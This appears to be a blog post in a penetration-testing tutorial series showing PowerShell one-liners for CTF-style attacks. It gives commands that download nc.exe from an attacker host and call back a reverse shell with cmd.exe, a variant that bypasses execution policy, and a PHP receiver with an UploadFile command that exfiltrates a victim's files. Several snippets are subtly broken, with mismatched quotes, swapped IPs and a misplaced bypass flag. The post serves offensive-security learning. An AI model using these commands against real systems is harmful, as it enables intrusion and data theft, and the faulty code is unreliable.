---
layout: post
title:  "Powershell For Penetration Testers Downloading And Exfiltrating"
author: nanobyte
date:   2020-08-28
description: PowerShell for Penetration Testing, and how to download files to a victim machine, and exfiltrate data from the victim machine
tags: PowerShell
---

This next installment in the Powershell For Penetration Testers looks into how an attacker can introduce files to a victim machine through a PowerShell download, as well as how to use PowerShell to upload files from a victim machine to your attacking box. I recently decided to continue on with this series to help other new comers into the field to learn as I learn. I recently used these skills on a recent Hack The Box machine, which if I remember to, will post the link to the writeup as a practical example.

<h1>Downloading Files with PowerShell</h1>

Using a PowerShell session, an attacker can quickly download files to a victim machine. There are hundreds of examples more intense then what I will show you, but here are my two methods and go-to's which I attempt whenever I am performing an attack. In the examples to follow, I will assume that I am attempting to download `nc.exe` to the victim machine, which I would then plan to use to call a reverse shell back to my attacking machine. I will assume that the victim machine I am attacking is a Windows based Operating System, and I am using Kali Linux as my attacking box. Luckily, PowerShell is installed on all Windows platforms, including Windows IoT Core (hint for the Hack The Box machine).

Please also assume that my Kali Linux has a HTTP server running (This can be Apache, Python's SimpleHTTPServer, whatever you prefer) and has an IP of 10.10.10.2, where the Windows machine is 10.10.10.1. 

<h2>Invoke-WebRequest</h2>

The first example is a quick one that can easily be remembered, using a PowerShell cmdlet:

{% highlight powershell lineos %}
powershell -c "mkdir c:\temp & Invoke-WebRequest -URI http://10.10.10.2/nc.exe -OUTFILE c:\temp\nc.exe"
{% endhighlight %}

This command first calls PowerShell to run a command with the `-c` flag. This is shortened from the `-Command` flag. This also assumes that you are on the machine with a command prompt with remote code execution. Then, the command is actually executed, first making a directory to save our `nc.exe` binary to. The following command then uses the `Invoke-WebRequest` cmdlet to download our file from the web server, and saves it to the `C:\temp` directory.

We could further this command by then calling `& c:\temp\nc.exe -e cmd.exe 10.10.10.1 1337` to connect back to our reverse shell (but that is outside of this article) to further our attack as a one-liner.

<h2>System.Net.WebClient</h2>

However, I frequently find that this is not the preferred method in Hack The Box or other CTF's to download files to victims. This is from personal experience, where the above failes completely or a binary is not downloaded, or downloading slowly. This brings us to our next approach, using PowerShell's `System.Net.WebClient`:

{% highlight powershell linenos %}
powershell -c "mkdir c:\temp & (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.2/nc.exe','C:\temp\nc.exe')"
{% endhighlight %}

This is similar to the example above, creating the directory before downloading, only using a .NET class to download.

<h2>Remember -ExecutionPolicy Bypasss</h2>

Along with PowerShell, remembe that there are sometimes restrictions placed onto the PowerShell session you may be running. I already have an article describing how to beat these execution policies, found <a href="/2020/05/23/powershell-for-pentesters-beating-restricted-policies.html" target="_blank">here</a>. To make sure that you beat these restricted execution methods, quickly throw a `-exec bypass` before your download command:

{% highlight powershell linenos %}
powershell -c "-exec bypass mkdir c:\temp & Invoke-WebRequest -URI http://10.10.10.2/nc.exe -OUTFILE c:\temp\nc.exe"
{% endhighlight %}

<h1>Exfiltrating Data</h1>

This is a method where you use a HTML server running on your Kali Linux attacking machine, where PowerShell can upload a file from a victim machine to your Kali. First, we will need to create a PHP page to process our upload request. This can be found here:

{% highlight php linenos %}
<?php
$uploaddir = '/var/www/uploads';
$uploadfile = '$uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
{% endhighlight %}

Also, make sure that the upload directory exists in your Kali Linux. Once saved and created into our `/var/www/html` directory as `upload.php`, start and stop our local Apache processes:

{% highlight powershell linenos %}
sudo service apache2 status
/etc/init.d/apache2 start
/etc/init.d/apache2 stop
{% endhighlight %}

And once running, from the victim box, call the PowerShell command to exfiltrate the data you require:

{% highlight powershell linenos %}
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.10.1/upload.php, 'file.txt')"
{% endhighlight %}

And check your upload directory for the file!

Thank you for reading, please keep coming back for more in this series as nanobyte learns and updates PowerShell For Penetration Testers!
